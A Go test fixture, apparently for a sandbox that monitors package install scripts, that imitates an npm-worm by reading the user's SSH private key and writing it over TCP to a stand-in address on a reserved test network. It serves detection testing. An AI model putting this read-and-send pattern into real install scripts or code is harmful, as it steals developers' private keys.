// Fixture: the canonical npm-worm pattern from INTENT.md's mission
// section — read a credential, send it out, all in the install script's
// own process (no child process), so both syscalls are captured.
//
// The SSH key is planted by the test harness at $HOME/.ssh/id_rsa. The
// sandbox maps $HOME to the project directory, so that is where the
// planted file lives. The exfil target is 203.0.113.21 (TEST-NET-3,
// unroutable) — the connect syscall is what's captured, not its success.
package main

import (
	"fmt"
	"net"
	"os"
	"path/filepath"
	"time"
)

func main() {
	keyPath := filepath.Join(os.Getenv("HOME"), ".ssh", "id_rsa")
	secret, _ := os.ReadFile(keyPath)

	conn, err := net.DialTimeout("tcp", "203.0.113.21:443", 2*time.Second)
	if err == nil {
		_, _ = conn.Write(secret)
		conn.Close()
	}

	fmt.Println("credential-read-and-exfil: done")
}
